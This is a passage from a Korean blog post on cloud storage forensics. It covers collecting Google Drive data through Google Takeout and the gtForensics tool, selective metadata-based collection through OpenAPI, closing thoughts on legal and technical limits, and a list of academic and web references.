<p>이와 같이 디지털 포렌식 관점에서 상당히 유용한 데이터들을 구글 Takeout을 통해 수집할 수 있으며 대량의 데이터를 조사하는데 효율적이라는 생각이 든다. 최근에는 Takeout을 통해 수집한 데이터를 파싱, 통합 정규화하는 gtForensics과 결과를 시각화 하는 뷰어 (<a target="_blank" rel="noopener" href="https://github.com/JJun1207/gtForensics_viewer">https://github.com/JJun1207/gtForensics_viewer</a>)의 연구도 진행되었다. [2]</p>
<p>다만 방대한 데이터가 저장되어 있는 클라우드 스토리지 특성상 사건과 관련된 데이터만 수집하는 것에 난항을 겪을 수 있다. 이러한 한계를 극복하기 위해 OpenAPI를 이용해 데이터를 선별하여 수집하는 방안을 제시한 연구도 존재한다.[12] 해당 연구에서는 클라우드 스토리지 내 저장된 파일들의 메타데이터를 수집하여 사건과 관계 있는 파일 정보를 선별하고 해당 파일만 서버에 요청하는 방안을 제시하였다.<br><br><br></p>
<h1 id="4-마무리하며"><a href="#4-마무리하며" class="headerlink" title="4. 마무리하며"></a>4. 마무리하며</h1><p>이 글에서는 클라우드의 기본 개념과 클라우드 스토리지 포렌식에 대한 아주 단편적인 부분을 다루었다. 스토리지 서비스 중에서도 구글 드라이브에 국한된 내용만을 소개했는데 다양한 클라우드 서비스가 있는 만큼 클라우드 스토리지 서비스의 구조나 메타데이터들에 차이가 있다. 이와 관련된 연구는 다양하게 진행되어 충분히 참고해 깊은 공부를 진행할 수 있다.</p>
<p>하지만 클라우드 포렌식에 대한 논의는 끝나지 않았다. 당장 해결해야 할 문제만 해도 다양하다. IaaS 환경에서 포렌식을 위해서는 서비스 제공자의 동의가 필요하며, 이는 압수 수색의 한계를 빗는다. 다양한 클라우드 서비스가 끊임없이 나오는 이상 데이터를 수집하고 분류하는 방법에 대한 연구가 계속 필요할 것이다. 즉, 디지털 포렌식을 공부하는 우리 또한 신 기술에 항상 주목하고 제도적인 부분에 어떤 변화가 있는지를 공부해야 한다.<br><br><br></p>
<h1 id="5-참고문헌"><a href="#5-참고문헌" class="headerlink" title="5. 참고문헌"></a>5. 참고문헌</h1><p>[1] 김민동. (n.d.). <em>클라우드</em> <em>스토리지의</em> <em>수사</em> <em>활용가능</em> <em>데이터</em> <em>획득</em> <em>방안</em> <em>연구</em>(석사). 성균관대학교 일반대학원, n.p..</p>
<p>[2] 김도현, 김준기, 이상진. “디지털 포렌식 관점에서의 구글 클라우드 데이터 분석 연구.” <em>정보보호학회지</em> 24 (n.d.): 1662-1669.</p>
<p>[3] 서승희, 김주은, 이창훈. (n.d.). 디지털 포렌식 관점에서 클라우드 스토리지 분석 연구 동향. <em>정보보호학회지</em>, <em>32</em>(2), pp. 29-36.</p>
<p>[4] 이원상, &amp; 이성식. (n.d.). <em>클라우드</em> <em>컴퓨팅</em> <em>환경에서의</em> <em>사이버범죄와</em> <em>대응방안</em> <em>연구</em> (pp. 187-234). n.p.: 한국형사정책연구원.</p>
<p>[5] 강승아. (n.d.). <em>포렌식</em> <em>데이터의</em> <em>분류체계와</em> <em>활용방안</em>(석사). 고려대학교 정보보호대학원, n.p..</p>
<p>[6] Peter Mell, Timothy Grance. (n.d.). <em>NIST Defenition of Cloud Computing</em>. n.p.: NIST.</p>
<p>[7] The Evolution of Cloud Computing: From the Early Ideas of John McCarthy to Modern Platforms . (n.d.). <a target="_blank" rel="noopener" href="https://www.elemento.cloud/post/the-evolution-of-cloud-computing-from-the-early-ideas-of-john-mccarthy-to-modern-platforms">https://www.elemento.cloud/post/the-evolution-of-cloud-computing-from-the-early-ideas-of-john-mccarthy-to-modern-platforms</a>.</p>
<p>[8] 클라우드 컴퓨팅(cloud computing)의 과거, 현재, 미래 . (n.d.). <a target="_blank" rel="noopener" href="https://www.igloo.co.kr/security-information/%ED%81%B4%EB%9D%BC%EC%9A%B0%EB%93%9C-%EC%BB%B4%ED%93%A8%ED%8C%85cloud-computing%EC%9D%98-%EA%B3%BC%EA%B1%B0-%ED%98%84%EC%9E%AC-%EB%AF%B8%EB%9E%98/">https://www.igloo.co.kr/security-information/%ED%81%B4%EB%9D%BC%EC%9A%B0%EB%93%9C-%EC%BB%B4%ED%93%A8%ED%8C%85cloud-computing%EC%9D%98-%EA%B3%BC%EA%B1%B0-%ED%98%84%EC%9E%AC-%EB%AF%B8%EB%9E%98/</a>.</p>
<p>[9] IaaS, PaaS 및 SaaS 비교 . (n.d.). <a target="_blank" rel="noopener" href="https://www.redhat.com/ko/topics/cloud-computing/iaas-vs-paas-vs-saas">https://www.redhat.com/ko/topics/cloud-computing/iaas-vs-paas-vs-saas</a>.</p>
<p>[10] [소개][초보자를 위한 AWS 웹구축] 0. 웹서버 아키텍처 소개 . (n.d.). <a target="_blank" rel="noopener" href="https://tech.cloud.nongshim.co.kr/2018/10/11/%EC%B4%88%EB%B3%B4%EC%9E%90%EB%A5%BC-%EC%9C%84%ED%95%9C-aws-%EC%9B%B9%EA%B5%AC%EC%B6%95-%EC%9B%B9%EC%84%9C%EB%B2%84-%EC%95%84%ED%82%A4%ED%85%8D%EC%B2%98-%EC%86%8C%EA%B0%9C/">https://tech.cloud.nongshim.co.kr/2018/10/11/%EC%B4%88%EB%B3%B4%EC%9E%90%EB%A5%BC-%EC%9C%84%ED%95%9C-aws-%EC%9B%B9%EA%B5%AC%EC%B6%95-%EC%9B%B9%EC%84%9C%EB%B2%84-%EC%95%84%ED%82%A4%ED%85%8D%EC%B2%98-%EC%86%8C%EA%B0%9C/</a>.</p>
<p>[11] Amazon Web Services 개요 . (n.d.). <a target="_blank" rel="noopener" href="https://docs.aws.amazon.com/ko_kr/whitepapers/latest/aws-overview/aws-overview.pdf#introduction">https://docs.aws.amazon.com/ko_kr&#x2F;whitepapers&#x2F;latest&#x2F;aws-overview&#x2F;aws-overview.pdf#introduction</a>.</p>
<p>[12] 한중수, 이승용, 오정훈, 김준수, 정혜진, 황현욱. (n.d.). <em>클라우드</em> <em>스토리지</em> <em>서비스에</em> <em>대한</em> <em>메타데이터</em> <em>기반</em> <em>파일선별수집</em> <em>방법</em> <em>및</em> <em>구현</em>. n.p.: 한국디지털포렌식학회.</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>





</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">SWING</span>
  </div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>

  






  





</body>
</html>
